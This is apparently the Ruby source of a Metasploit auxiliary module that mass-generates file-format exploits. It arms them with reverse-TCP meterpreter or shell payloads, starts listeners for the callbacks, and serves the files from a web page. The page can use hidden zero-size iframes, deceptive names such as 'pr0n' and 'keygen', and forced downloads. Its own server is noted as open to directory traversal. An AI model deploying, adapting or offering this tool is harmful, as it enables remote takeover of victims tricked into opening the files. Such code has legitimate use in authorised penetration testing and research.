##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
#require 'rex/exploitation/javascriptosdetect'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML
	
	def initialize(info = {})
		super(update_info(info, 
			'Name'        => 'File Format Exploit Generator',
			'Version'     => '$Revision: 8210 $',
			'Description' => %q{
				This module generates a combination of File format exploits and make them available to a client. 94.7% Based on browser autopwn by egypt.
				},
			'Author'      => 
				[
					'et',
				],
			'License'     => BSD_LICENSE,
			'Actions'     =>
				[
					[ 'WebServer', {
						'Description' => 'Deliver file format exploits in a web page with links to the actual files' 
					} ],
					[ 'OnlyFiles', {
						'Description' => 'Create file format exploits in selected directory' 
					} ],
					[ 'list', { 
						'Description' => 'List the exploit modules that would be started'
					} ]
				],
			'PassiveActions' => 
				[ 'WebServer', 'Email' ],
			'DefaultAction'  => 'WebServer'))

		register_options([
			OptAddress.new('LHOST', [ true, 
				'The IP address to use for reverse-connect payloads'
			]),
			OptString.new('OUTPUTPATH', [ true, 
				'The location of the files.', File.join(Msf::Config.install_root, 'data', 'exploits','file_autopwn')]),
			OptBool.new('CREATEFILES', [ true, 
				'Set to false in case files are already in the defined path',
				true
			]),	
			OptBool.new('USECONTENTTYPE', [ true, 
				'Use Content-type header according to file extension. Many exploits may fail depending on this value',
				true
			]),	
			
		], self.class)

		register_advanced_options([
			OptString.new('MATCH', [false, 
				'Only attempt to use exploits whose name matches this regex'
			]),
			OptString.new('EXCLUDE', [false, 
				'Only attempt to use exploits whose name DOES NOT match this regex'
			]),
			OptBool.new('USEMODNAME', [false, 
				'Use module names as file names',
				true
			]),
			OptBool.new('USEIFRAMES', [false, 
				'Deliver each file as an iframe in webserver',
				false
			]),
			OptString.new('TITLE', [ true, 
				'The HTML page title.', 'WALL oF SHAME'
			]),
			OptString.new('COMMENT', [ true, 
				'HTML page text.', '<b>Welcome!</b><br>'
			]),
			OptPort.new('LPORT_WIN32', [false, 
				'The port to use for Windows reverse-connect payloads, default is 3333'
			]),
			OptPort.new('LPORT_MULTI', [false, 
				'The port to use for Multi reverse-connect payloads, default is 4444'
			]),
			OptPort.new('LPORT_MAC', [false, 
				'The port to use for Mac reverse-connect payloads, default is 5555'
			]),
			OptPort.new('LPORT_GENERIC', [false, 
				'The port to use for generic reverse-connect payloads, default is 6666'
			]),
		], self.class)

		@exploits = Hash.new
		@payloads = Hash.new
		@targetcache = Hash.new
	end


	def run
		if (action.name == 'list')
			m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
			e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
			[ [framework.exploits, 'exploit' ] ].each do |mtype|
				mtype[0].each_module do |name, mod|
					m = mod.new
				
					if ((m.kind_of? Msf::Exploit::FILEFORMAT) and name =~ m_regex and name !~ e_regex)
						@exploits[name] = nil
						print_line name
						#print_line
						#print_line m.description
						#print_line
						#print_line "Targets"
						#
						#begin
						#	tout = Serializer::ReadableText.dump_exploit_target(m, '   ')
						#	print_line tout
						#rescue
						#	print_error "Error retrieving targets in #{name}"	
						#end							
					end					
				end
			end	
			print_line
			print_status("Found #{@exploits.length} exploit modules")
		elsif (action.name == 'WebServer')
			if (!framework.db.active)
				warn_no_database
			end
			start_exploit_modules()
			
			if !datastore['CREATEFILES']
				print_status("FILES NOT CREATED")
			end
			
			if @exploits.length < 1 and datastore["CREATEFILES"]
				print_error("No exploits, check your MATCH and EXCLUDE settings")
				return false
			end
			exploit()
		elsif (action.name == 'OnlyFiles')
			if (!framework.db.active)
				warn_no_database
			end
			start_exploit_modules()
			
			if @exploits.length < 1 
				print_error("No exploits, check your MATCH and EXCLUDE settings")
				return false
			end	
		end	
	end


	def setup

		#
		# I'm still not sold that this is the best way to do this, but random
		# LPORTs causes confusion when things break and breakage when firewalls
		# are in the way.  I think the ideal solution is to have
		# self-identifying payloads so we'd only need 1 LPORT for multiple
		# stagers.
		#
		@win_lport =   datastore['LPORT_WIN32'] || 3333
		@multi_lport = datastore['LPORT_MULTI'] || 4444
		@osx_lport =   datastore['LPORT_MACOS'] || 5555
		@gen_lport =   datastore['LPORT_GENERIC'] || 6666

		minrank = framework.datastore['MinimumRank'] || 'manual'
		if not RankingName.values.include?(minrank)
			print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join("|")})")
			wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
		end
		@minrank = RankingName.invert[minrank]

	end


	def init_exploit(name, mod = nil, targ = 0)
		if mod.nil?
			@exploits[name] = framework.modules.create(name)
		else
			@exploits[name] = mod.new
		end
		modrank = @exploits[name].class.const_defined?('Rank') ? @exploits[name].class.const_get('Rank') : NormalRanking
		if (modrank < @minrank)
			@exploits.delete(name)
			return false
		end

		case name
		when %r{windows}
			payload='windows/meterpreter/reverse_tcp'
			lport = @win_lport
		when %r{multi}
			payload='windows/meterpreter/reverse_tcp'
			lport = @multi_lport
		#when %r{osx}
			# Some day...
			#payload='osx/meterpreter/reverse_tcp'
		else
			lport = @gen_lport
			payload='generic/shell_reverse_tcp'
		end	
		@payloads[lport] = payload

		if datastore['CREATEFILES']
			print_status("File Format exploit #{name} with payload #{payload}")
		end
		
		@exploits[name].datastore['SRVHOST'] = datastore['SRVHOST']
		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']

		# For testing, set the exploit uri to the name of the exploit so it's
		# easy to tell what is happening from the browser.
		@exploits[name].datastore['OUTPUTPATH'] = datastore['OUTPUTPATH']
		
		if (datastore['USEMODNAME'])
			@exploits[name].datastore['FILENAME'] = name.gsub(/[\\\/]/, '_') + '_' + @exploits[name].datastore['FILENAME']  
		else
			# Later change for some simple names
			@exploits[name].datastore['FILENAME'] = filerename(File.extname(@exploits[name].datastore['FILENAME']))
		end

		@exploits[name].datastore['LPORT'] = lport
		@exploits[name].datastore['LHOST'] = @lhost
		@exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
		@exploits[name].datastore['DisablePayloadHandler'] = true
		
		if datastore['CREATEFILES']
			@exploits[name].exploit_simple(
				'LocalInput'     => self.user_input,
				'LocalOutput'    => self.user_output,
				'Target'         => targ,
				'Payload'        => payload,
				'RunAsJob'       => true)

			# It takes a little time for the resources to get set up, so sleep for
			# a bit to make sure the exploit is fully working.  Without this,
			# mod.get_resource doesn't exist when we need it.
			Rex::ThreadSafe.sleep(0.5)
			# Make sure this exploit got set up correctly, return false if it
			# didn't
			if framework.jobs[@exploits[name].job_id.to_s].nil?
				print_error("Failed to start exploit module #{name}")
				@exploits.delete(name)
				return false
			end
		end	
		return true
	end


	def start_exploit_modules() 
		@lhost = (datastore['LHOST'] || "0.0.0.0")

		print_line
		print_status("Starting exploit modules on host #{@lhost}...")
		print_status("---")
		print_line
		m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
		e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
		
	
		[ [framework.exploits, 'exploit' ] ].each do |mtype|
			framework.exploits.each_module do |name, mod|
				m = mod.new
				if (m.kind_of? Msf::Exploit::FILEFORMAT) and name =~ m_regex and name !~ e_regex
					next if !(init_exploit(name))
				end
			end
		end
		
		if action.name == 'OnlyFiles'
			print_status "--- Done. Files created in #{datastore['OUTPUTPATH']}"
			return
		end
						
		# start handlers for each type of payload
		[@win_lport, @lin_lport, @osx_lport, @gen_lport].each do |lport|
			if (lport and @payloads[lport])
				print_status("Starting handler for #{@payloads[lport]} on port #{lport}")
				multihandler = framework.modules.create("exploit/multi/handler")
				multihandler.datastore['LPORT'] = lport
				multihandler.datastore['LHOST'] = @lhost
				multihandler.datastore['ExitOnSession'] = false
				multihandler.datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
				multihandler.exploit_simple(
					'LocalInput'     => self.user_input,
					'LocalOutput'    => self.user_output,
					'Payload'        => @payloads[lport],
					'RunAsJob'       => true)
			end
		end
		# let the handlers get set up
		Rex::ThreadSafe.sleep(0.5)

		print_line
		print_status("--- Done, found %bld%grn#{@exploits.length}%clr exploit modules")
		print_line

	end

	def on_request_uri(cli, request) 
		#
		# I have NOT fixed dir. transversals! 
		#
	
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

		case request.uri
		when self.get_resource
			# This is the first request. 
			response = create_response()
			response["Expires"] = "0"

			response.body  = "<html > <head > <title > Wall of Shame </title> </head> "
			response.body << "<body>"
			response.body << "<h2>#{datastore['TITLE']}</h2><br>"
			response.body << "#{datastore['COMMENT']}"
			Dir.foreach(datastore['OUTPUTPATH']) do |entry|
				if entry == '.' or entry == '..'
					# do nothing
				else	
					if !datastore['USEIFRAMES']
						response.body << "<a href= #{self.get_resource+'/'+entry}>#{entry}</a><br>"
					else
						response.body << "<iframe style=\"width:0px; height:0px; border: 0px\" src=#{self.get_resource+'/'+entry}><b>#{entry}</b></iframe><br>"
					end
				end
			end
			response.body << "</body></html>"

			cli.send_response(response)
		when %r{^#{self.get_resource}.*}
		
			fname = request.uri.gsub("#{self.get_resource}/","")
		
			response = create_response()
			response["Expires"] = "0"
			
			
			if datastore['USECONTENTTYPE']
				response["Content-type"] = ctype(File.extname(fname))['ctype']
				if ctype(File.extname(fname))['cdisp']
					response["Content-disposition"] = "attachment; filename=#{fname}"
				end
			else
				response["Content-type"] = "application/octet-stream"
				response["Content-disposition"] = "attachment; filename=#{fname}"
			end
			
			fullname = File.join(datastore['OUTPUTPATH'],fname)
			
			if File.exist?(fullname) and File.file?(fullname)
				src = File.open(fullname, "rb")
				while (not src.eof?)
					response.body << src.read(256)
				end
				src.close
				src = nil
			else
				print_status("404ing #{request.uri}")
			    send_not_found(cli)
			end
			cli.send_response(response)
		else
			print_status("404ing #{request.uri}")
			send_not_found(cli)
			return false
		end
	end
	
	def filerename(ext)
		#
		# A sample way to change file name by type instead of using the ugly 
		# exploit name
		#
		
		case ext
		when ".html" then
			n = "pr0n" + Rex::Text.rand_text_numeric(4)
		when ".exe" then
			n = "core_canvas_keygen" + Rex::Text.rand_text_numeric(4)
		when ".pdf" then
			n = "ebook" + Rex::Text.rand_text_numeric(6)
		when ".zip" then
			n = "gibson_passwd" + Rex::Text.rand_text_numeric(4)
		when ".xsl" then
			n = "test" + Rex::Text.rand_text_numeric(2)
		when ".m3u" then
			n = "musical" + Rex::Text.rand_text_numeric(2)
		else	
			n = "data" + Rex::Text.rand_text_numeric(4)
		end
		
		n << ext
		
		return n
	
	end

	def ctype(ext)
		aret = {}
		
		
		#
		# Need to force download as some exploits (i.e. pdf) 
		# dont work thru the browser only work when the file is saved and/or opened 
		#
		
		# ctype:  Content-type
		# cdisp:  true/false Include a "Content-disposition" header to force save as
		
		case ext
		when ".html" then
			aret['ctype'] = "text/html"
			aret['cdisp'] = false
		when ".exe" then
		 	aret['ctype'] = "application/octet-stream"
			aret['cdisp'] = false
		when ".pdf" then
			#
			# See comments above
			# aret['ctype'] = "application/pdf"
			aret['ctype'] = "application/octet-stream"
			aret['cdisp'] = true
		when ".zip" then
			aret['ctype'] = "application/zip"
			aret['cdisp'] = false
		when ".xsl" then
			aret['ctype'] = "text/xml"
			aret['cdisp'] = false
		when ".m3u" then
			aret['ctype'] = "audio/x-mpegurl"
			aret['cdisp'] = false
		else	
			aret['ctype'] = "application/octet-stream"
			aret['cdisp'] = false
		end
		return aret
	end	

	def warn_no_database
		print_error("WARNING: Database is disabled")
	end
end

